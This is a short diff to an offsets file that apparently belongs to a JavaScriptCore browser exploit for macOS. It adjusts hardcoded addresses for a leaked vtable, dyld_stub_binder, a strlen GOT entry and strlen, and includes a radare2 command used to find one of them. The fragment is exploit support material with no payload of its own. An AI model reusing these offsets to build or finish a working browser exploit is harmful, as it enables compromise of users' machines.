@@ -1,22 +1,20 @@
-// We could get rid of this entire file by either searching for memory patters (of the function code) or
+// We could get rid of this entire file by either searching for memory patterns (of the function code) or
 // by writing a mach-o/dyld_shared_cache parser in JavaScript. Offsets are fine for this purpose though...
 
 // Offset of leaked vtable from the base of the JavaScriptCore .bss section
-const JSC_VTAB_OFFSET = 0xe5e8;
+//const JSC_VTAB_OFFSET = 0xe5e8;
+const JSC_VTAB_OFFSET = 0xe5f8;
 
 // Offset of dyld_stub_loader from the base of libdyld.dylib
-//const DYLD_STUB_LOADER_OFFSET = 0x12a8;
-const DYLD_STUB_LOADER_OFFSET = 0x1278;
+//const DYLD_STUB_LOADER_OFFSET = 0x1278;
+const DYLD_STUB_LOADER_OFFSET = 0x12a8;
 
 //r2 -qQ libdyld.dylib -c "aa; afl" | grep dyld_stub
 //0x000012a8   15 408          sym.dyld_stub_binder
 
 // Offset of GOT entry for strlen from the base of the JavaScriptCore .bss section
 //const STRLEN_GOT_OFFSET = 0xee0;
-const STRLEN_GOT_OFFSET = 0xee0;
-
-//29 0x00001000     0 0x00baf690  4072 -rw- 29.__DATA.__bss
-//21706 0x00acf162 0x00ace162  LOCAL   FUNC    0 imp.strlen
+const STRLEN_GOT_OFFSET = 0xee8;
 
 // Offset of strlen from the base of libsystem_c.dylib
 //const STRLEN_OFFSET = 0x1420;
